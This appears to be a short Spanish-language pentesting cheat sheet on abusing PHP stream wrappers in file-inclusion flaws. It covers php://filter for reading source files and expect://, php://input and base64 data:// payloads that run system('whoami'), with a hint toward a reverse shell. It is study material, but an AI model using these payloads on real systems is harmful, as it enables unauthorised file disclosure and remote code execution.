-----------------
- Tags: #explotación #web #linux #php
--------------

Existen varios wrappers con distintas funcionalidades:

- php://filter/convert.base64-encode/resource=*Nombre del archivo que queremos representar en base 64*: Como se menciona, permite representar archivo en un one line expresado en base 64.
- php://filter/read=string.rot13/resource=*Nombre del  archivo que se requiere representar pero rotado en 13 posiciones el contenido*
- php://filter/convert.iconv.utf-8.utf-16/resource=*Nombre del archivo*: Permite que el navegador no interprete el código php sino que lo represente en la página.

### Wrappers maliciosos para ejecució remota de comandos

- expect://whoami: Permite ejeución de comandos ([[RCE]]).
- /?filename=php://input. Para este el método que se envíe debe ser POST y se debe pasar en PHP como el siguiente (En vez de whoami se puede incluir el comando que se requiere, como por ejemplo gestionar el envío de una reverse shell:

```php
<?php system('whoami'); ?>
```

- data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=: Sirve para pasar el comando en base 64. Para este caso se codificó a base 64 el siguiente comando PHP:

```php
<?php system('whoami'); ?>
```

*Tener en cuenta que se debe url-encodear (Control + U) para Burpsuite.*

